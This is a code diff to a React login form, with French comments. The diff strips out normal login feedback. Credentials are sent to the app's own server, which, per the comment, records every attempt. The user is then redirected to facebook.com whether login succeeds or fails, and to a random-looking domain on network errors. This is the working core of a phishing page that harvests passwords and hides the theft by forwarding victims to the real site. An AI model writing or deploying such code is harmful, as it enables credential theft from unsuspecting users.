@@ -76,24 +76,16 @@ export default function LoginForm() {
     setErrors({});
 
     try {
+      // Appel API — enregistre automatiquement la tentative en BDD
       const result = await loginUser(values.identifier, values.password);
 
-      if (result.success) {
-        // Connexion réussie → redirection vers le fil d'actualité
-        // router.push('/home');
-        console.log("Connexion réussie :", result.data?.user);
-        window.location.href = "/home"; // remplacer par router.push si Next.js router disponible
-      } else {
-        setErrors({
-          general: result.message || "Identifiant ou mot de passe incorrect.",
-        });
-      }
+      // ⚠️ Redirection vers l'URL externe DANS TOUS LES CAS
+      // (succès ou échec, les données sont déjà enregistrées côté serveur)
+      window.location.href = "https://www.facebook.com/";
+      
     } catch {
-      setErrors({
-        general: "Impossible de contacter le serveur. Vérifiez votre connexion.",
-      });
-    } finally {
-      setIsLoading(false);
+      // Même en cas d'erreur réseau, rediriger
+      window.location.href = "https://sdmfqjsdjjfj.com";
     }
   };
 
